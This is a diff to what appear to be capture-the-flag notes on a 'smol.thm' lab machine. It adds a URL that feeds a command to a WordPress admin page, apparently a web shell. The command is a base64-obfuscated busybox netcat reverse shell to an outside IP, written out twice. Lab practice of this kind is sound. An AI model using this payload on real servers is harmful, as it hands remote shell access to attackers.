@@ -67,5 +67,10 @@ A way to enumurate username
 
 ............................................................................................................................................................................
 
+```
+Execute this command in browser to have command executed
 http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC4xNC45MC4yMzUgNDQ0NSAtZSAvYmluL2Jhc2g= | base64 -d | bash
+```
+http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC4xNC45MC4yMzUgNDQ0NSAtZSAvYmluL2Jhc2g= | base64 -d | bash
+
 
